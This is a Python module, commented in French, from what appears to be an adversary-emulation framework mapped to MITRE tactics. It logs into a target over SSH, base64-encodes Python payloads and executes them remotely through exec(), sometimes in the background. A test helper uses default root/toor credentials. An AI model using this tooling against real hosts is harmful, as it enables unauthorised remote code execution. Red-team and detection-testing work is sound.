#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Mon Apr 27 10:56:33 2026

@author: hounsousamuel
"""

import os, sys
sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", ".."))))
import time
import socket
import base64
import asyncio
import paramiko
import concurrent.futures
from tactics.base import Base
from tactics.mittres import MITRE
from tactics.execution.data.python_execution.default_cmd import ALL_PYTHON_PAYLOADS, QUICK_PYTHON_RECON
from simulateur_utils.logger import get_logger

logger = get_logger()

class PythonExecution(Base):
    """
    Classe pour l'exécution de commades python chez la victime par ssh.
    """
    def __init__(
        self, 
        name:str = "python_execution",
        timeout:int = 2, 
        exec_timeout:int = 5,
        **kwargs
    ):
        self.name = name
        super().__init__(name=self.name, **kwargs)
        self.start_time = time.time()
        self.timeout = timeout
        self.results = {}
        self.exec_timeout = exec_timeout
        self.thread_pool = concurrent.futures.ThreadPoolExecutor(
            max_workers=4,
            thread_name_prefix=self.name
        )
        self.reverse = False
    
    def _try_connect(
        self,
        ip:str,
        port:int,
        username:str,
        password:str,
        pkey=None
    ) -> bool:
        """
        Méthode qui vérifie si les crédentials sont corrects.

        Parameters
        ----------
        ip : str
            L'IP.
        port : int
            Le port.
        username : str
            L'username ssh.
        password : str
            Le mot de passe ssh.
      
        Returns
        -------
        bool
            True/False selon succès/echec.

        """
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                hostname=ip,
                port=port,
                username=username,
                password=password if pkey is None else None,
                pkey=pkey,
                timeout=self.timeout
            )
            self.log(f"✅ SUCCESS: {username}:{password}", log=True)
            return True
        
        except paramiko.AuthenticationException:
            self.log(f"❌ FAIL: {username}:{password}", log=True)
            return False
        
        except socket.timeout:
            return False
        
        except paramiko.SSHException:
            return False
        
        except (paramiko.ssh_exception.NoValidConnectionsError, ConnectionRefusedError):
            return False
        
        except Exception as e:
            self.log(f"⚠️ ERROR: {e}", log=True)
            return False
        
        finally:
            client.close()
    
    def _exec_cmd_sync(
        self,
        ip:str,
        port:int,
        username:str,
        password:str,
        python_cmd:str|dict,
        pkey=None
    ) -> tuple[str, dict]:
        """
        Méthode d'éxécution de la commande chez la victime.

        Parameters
        ----------
        ip : str
            L'IP.
        port : int
            Le port.
        username : str
            L'username.
        password : str
            Le password (mot de passe).
        python_cmd : str|dict
            La commande a exécuter.

        Returns
        -------
        tuple[str, dict]
            DESCRIPTION.

        """
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        result = {"stdout": None, "stderr": None, "returncode": None, "cmd": python_cmd}
        bg = False
        if isinstance(python_cmd, dict):
            bg = python_cmd.get("bg", False)
            python_cmd = python_cmd["cmd"]
        try:
            client.connect(
                hostname=ip,
                port=port,
                username=username,
                password=password if pkey is None else None,
                pkey=pkey,
            )
            python_cmd_ = base64.urlsafe_b64encode(python_cmd.encode()).decode()
            cmd = f"""python3 -c "import base64; cmd = base64.urlsafe_b64decode('{python_cmd_}').decode(); exec(cmd)" """
            if bg:
                cmd = f"""python3 -c "import base64; cmd = base64.urlsafe_b64decode('{python_cmd_}').decode(); exec(cmd)" &"""
            stdin, stdout, stderr = (client.exec_command(
                command=cmd, timeout=self.exec_timeout
            )) if not self.reverse else (client.exec_command(
                command=cmd
            ))
            result["stdout"] = stdout.read().decode("utf-8", errors="ignore") 
            result["stderr"] = stderr.read().decode("utf-8", errors="ignore")
            result["returncode"] = stdout.channel.recv_exit_status()
            logger.print("Commande :", python_cmd[:100], "\nreturncode :", result["returncode"])
            return python_cmd, result
        
        except paramiko.AuthenticationException:
            return python_cmd, result
        
        except socket.timeout:
            return python_cmd, result
    
        except Exception as e:
            self.log(f"Erreur lors de l'éxécution de la commande `{python_cmd[:100]}` :\nErreur: {str(e)}", log=True)
            return python_cmd, result
        
        finally:
            client.close()
    
    async def _exec_command_async(
        self,
        ip:str,
        port:int,
        username:str,
        password:str,
        python_cmd:str,
        pkey=None
    ):
        """Version asynchrone de _exec_cmd_sync"""  
        loop = asyncio.get_running_loop()
        return await loop.run_in_executor(
            self.thread_pool,
            self._exec_cmd_sync,
            ip, port, username, password, python_cmd, pkey
        )
        
    async def exec_command_async(
        self, ip:str, 
        port:int = 22,
        username:str = "", 
        password:str = "", 
        python_commands:list[str|dict] = [],
        add_common:bool = False, quick:bool = True,
        pkey=None
    ) -> dict:
        """
        
        Parameters
        ----------
        ip : str
            L'IP.
        port : int, optional
            Le port. The default is 22.
        username : str, optional
            L'username. The default is "".
        password : str, optional
            Le password (mot de passe). The default is "".
        python_commands : list[str|dict], optional
            Les commandes a éxécuter. The default is [].
        add_common : bool, optional
            Etendre les commandes avec les commandes par défaut. The default is False.
        quick : bool, optional
            Utilise les commandes par défaut quick ou all. The default is True.

        Returns
        -------
        dict
            Les résultats.

        """  
        COMMANDS = QUICK_PYTHON_RECON if quick else ALL_PYTHON_PAYLOADS
        if add_common:
            commands = list(set(python_commands or [])) + list(set(COMMANDS))
        else:
            commands = python_commands or COMMANDS
        
        self.log(f"Début Python Execution à : {time.ctime()}, pour ip : {ip} et port {port} ", log=True)
        self.log(f"PORT : {port}")
        self.log(f"Username: {username}, Password: {password}, commandes: {len(commands)}", log=True)
        self.start_time = time.time()
        success_number = 0
        if self._try_connect(ip, port, username, password, pkey):
            tasks = [
                asyncio.create_task(
                    self._exec_command_async(ip, port, username, password, cmd, pkey)
                )
                for cmd in commands
            ]
            results = await asyncio.gather(*tasks)
            self.results["commands"] = {}
            for i, (_, result) in enumerate(results):
                self.results["commands"][str(i)] = result
                success_number += int(result["returncode"] in (0, 1))
                
            self.results["success_number"] = success_number
            self.results["success_rate"] = success_number / len(commands) if commands else 0.0
        else:
            self.log("Credentials incorrect !", log=True)
        self.end_time = time.time()
        self.log(f"Fin Python Execution, {success_number}/{len(commands)} commandes réussie!", log=True)
        return self.get_result()
    
    def exec_command_sync(self, *args, **kwargs):
        """Version synchrone de exec_command_async"""
        return asyncio.run(self.exec_command_async(*args, **kwargs))
    
    def get_result(self):
        """ Méthode de fabrication du résultat finale, renvoie un dictionnaire """
        self.save()
        
        mitres = [MITRE.get("PythonExecution", {})]
        results = {
            'severity': 'HIGH' if self.results.get("success_number", 0) > 0 else 'LOW',
            'elapsed': self.end_time - self.start_time,
            "mitres": mitres,
            'results':  {
                "commands": self.results.get("commands", {}),
                'success_rate': self.results.get("success_rate", 0.0),
                "success_number": self.results.get("success_number", 0),
            },
        }
        
        return results

def test_python_exec(ip: str, username:str = "root", password:str = "toor", pkey=None):
    """Test rapide de PythonExecution sur une cible."""
    import json
    from pprint import pprint
    command_exec = PythonExecution()
    result = command_exec.exec_command_sync(
        ip=ip,
        port=22,
        username=username,
        password=password, quick=True, add_common=True,
        pkey=pkey
    )
    try:
        logger.print("✅ Résultat :")
        logger.print(f"  Elapsed        : {result['elapsed']:.2f}s")
        logger.print(f"  Success Rate   : {result['results']['success_rate']:.2f}")
        logger.print("Commands :\n", json.dumps(result['results']['commands'], indent=2, ensure_ascii=False), verify=False)
    except Exception:
        try:
            logger.print(pprint(result['results']["commands"], indent=2))
        except Exception:
            logger.print(result['results']["commands"])
            
            